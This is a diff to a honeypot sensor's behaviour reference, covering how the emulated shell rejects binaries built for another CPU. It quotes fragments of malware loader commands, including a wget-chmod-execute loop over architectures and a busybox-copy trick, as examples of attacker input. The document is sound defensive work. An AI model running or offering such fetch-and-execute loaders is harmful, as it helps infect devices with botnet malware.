@@ -4,7 +4,7 @@ audience: all
 status: current
 owner: maintainer
 applies-to: 0.4.0 (untagged; latest tag v0.1.0)
-last-verified: 2026-10-07
+last-verified: 2026-10-08
 -->
 
 # Sensor behavior reference
@@ -401,7 +401,9 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   with the raw `command` and no `url`, so the fetcher is never handed a guessed target; a `tftp`
   upload (`-p`, `put`) emits no download event and saves no file,
   `crates/sensor-framework/src/shell/tftp.rs#parse`),
-  `chmod`/`cp`/`rm`/`mkdir` (silent success), `sleep` (returns at once; GNU's errors for a
+  `chmod` (silent success; on the Ubuntu persona a missing operand is named as GNU chmod does,
+  `chmod: cannot access 'x': No such file or directory`, status 1),
+  `cp`/`rm`/`mkdir` (silent success), `sleep` (returns at once; GNU's errors for a
   missing or bad interval), `cd`, `exit`/`logout`; an
   unknown command uses the active shell level's diagnostic form, and so does a path that does
   not exist: bash's `No such file or directory`, dash's and mksh's `not found`
@@ -458,7 +460,29 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   arguments are four octets and a port, the shell answers as that downloader does when its server
   cannot be reached: no output and status 1 [inferred: the exact status of the observed sample],
   since this box connects nowhere and so never gets the stage 2 the loader looks for next; any
-  other session-made file runs as an empty program (status 0). The stage-2 URL it would have
+  other session-made file runs as an empty program (status 0), unless it is built for another CPU
+  (next bullet).
+- Executing a program built for another CPU fails
+  (`crates/sensor-framework/src/shell/arch.rs`). Per-architecture loops
+  (`for a in mips mpsl arm4 ... x86_64 x86; do wget .../$a -O .c; chmod +x .c && ./.c && break;
+  done`) and the Eclipse busybox-copy trick (`cp /bin/busybox eclipsebox; cat eclipse.mips >
+  eclipsebox; ./eclipsebox`) rely on a foreign build failing so the next one is tried. A file is
+  judged by its bytes when they are an ELF (class, byte order and `e_machine` against the persona:
+  x86_64 on Ubuntu, which also runs 32-bit x86 as the distribution's kernel does, and 32-bit ARM
+  of any generation on the Android persona's `armv7l`). The fake fetch applets write a canned HTML
+  body, not a binary, so a fetched file is judged by the architecture token in its URL's file name,
+  else in its local name (`mips`, `mipsel`/`mpsl`, `arm`/`arm4`..`arm7`/`armv7l`, `aarch64`/`arm64`,
+  `ppc`, `sh4`, `m68k`, `spc`/`sparc`, `i586`/`i686`/`x86`, `x86_64`/`amd64`; a whole name part, so
+  `alarm` or `mips.sh` name nothing). That origin follows `cp`, `mv` and `cat FILE > DEST`, and any
+  other write to the file drops it. A file with neither (a script the session typed, a fetch with
+  no token in it) runs silently as before. The refusal is bash 5.1's `bash: ./x: cannot execute
+  binary file: Exec format error` (status 126; `-bash:` at the login prompt, `bash: line 1:` for an
+  exec request), dash's `sh: 1: ./x: Exec format error` (status 126), both reproduced on Ubuntu
+  22.04, and on the Android persona mksh's `sh: ./x: not executable: 32-bit ELF file` (`64-bit`
+  for a 64-bit build), read from the AOSP marshmallow-release `external/mksh/src/exec.c`
+  (`scriptexec`). TODO: mksh's status is 1 by that source's `errorf` and the phone's exact prefix
+  has no device capture [unverified]. The script-file form of dash's prefix (`.s: 3:` rather than
+  `sh: 3:`) is a known gap shared with every dash script error. The stage-2 URL it would have
   requested is emitted as a `honeypot_file_download` marked `derived_from: echo_loader_args`, for
   the vetted fetcher only ([attack-surfaces.md](../security/attack-surfaces.md#malware-fetcher-attacker-directed-outbound)).
 - Base64 APK loaders on the Android shell (`crates/sensor-framework/src/shell/loader.rs`,
